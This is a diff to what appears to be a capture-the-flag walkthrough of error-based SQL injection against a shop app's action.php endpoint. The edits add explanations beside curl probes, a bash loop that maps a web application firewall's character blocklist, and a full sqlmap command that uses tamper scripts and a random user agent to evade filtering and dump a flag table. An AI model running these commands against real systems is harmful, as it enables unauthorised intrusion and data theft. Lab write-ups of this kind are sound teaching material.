@@ -6,13 +6,14 @@
 
 ## Reconnaissance
 
-Static-looking pages: `index.html`, `shop.html`, `product-single.html`, `cart.html`. No obvious dynamic links.
+The app has static-looking pages: `index.html`, `shop.html`, `product-single.html`, and `cart.html`. There are no obvious dynamic links.
 
-The injection point is hidden in JavaScript on `shop.html` — the "Add to Cart" button POSTs JSON to a backend endpoint:
+The injection point is hidden in JavaScript (JS) on `shop.html`. The "Add to Cart" button sends a JavaScript Object Notation (JSON) POST request to a backend endpoint:
 
 ```bash
 curl -sk "http://TARGET/shop.html" | grep -B2 -A8 'action.php'
 ```
+> Fetches the page source silently (`-sk`) and greps for the backend endpoint name. `-B2 -A8` shows 2 lines before and 8 lines after each match so you see the full JS context. Replace `TARGET` with your target's IP/host.
 
 ```javascript
 let url = "action.php"; 
@@ -35,11 +36,12 @@ curl -sk -X POST "http://TARGET/action.php" \
 
 # → SQLSTATE[42000]: Syntax error ... near '', 476, 1, 777, 0)' at line 1
 ```
+> Sends a JSON POST with a single quote appended to the `id` value to test for SQL injection. A verbose SQL error in the response confirms error-based injection is viable. Replace `TARGET` with your target's IP/host.
 
-Verbose SQL error confirms:
-- Error-based injection viable
-- Underlying query is an INSERT (multiple comma-separated values)
-- MariaDB backend
+The verbose SQL error in the response confirms three things:
+- Error-based injection is viable
+- The underlying query is an INSERT statement (you can see multiple comma-separated values in the error)
+- The database is MariaDB
 
 ---
 
@@ -55,12 +57,13 @@ for chr in '=' '>' '<' ' ' "'" '"' '#' '*'; do
   [ -z "$resp" ] && echo "BLOCKED: '$chr'" || echo "passed: '$chr'"
 done
 ```
+> Tests each special character individually to map the WAF's blocklist. An empty response means the character was blocked; any response means it passed. Replace `TARGET` with your target's IP/host.
 
-Result: `<`, `>`, and **space** are filtered. Same pattern as Case 11.
+Result: `<`, `>`, and **space** are all filtered. This is the same pattern as Case 11.
 
 Tampers needed:
-- `between` → rewrites `>` and `=` (handles `<`/`>` filter)
-- Space handling is automatic in `between`'s sibling payloads, OR add `space2comment` to be safe
+- `between` — rewrites `>` and `=` to avoid the `<`/`>` filter
+- Space handling is built into `between`'s sibling payloads. Add `space2comment` as well if spaces are still causing issues.
 
 ---
 
@@ -73,6 +76,7 @@ sqlmap -u "http://154.57.164.78:31836/action.php" \
   --batch --flush-session \
   --dump -T final_flag -D production
 ```
+> Full exploitation command. `--tamper=between` bypasses the `<`/`>`/`=` character filter. `--random-agent` bypasses the UA blocklist. `--flush-session` clears cached failed-detection state. `-T final_flag -D production` targets the specific table directly. Replace the URL with your target's address.
 
 | Flag | Why |
 |------|-----|
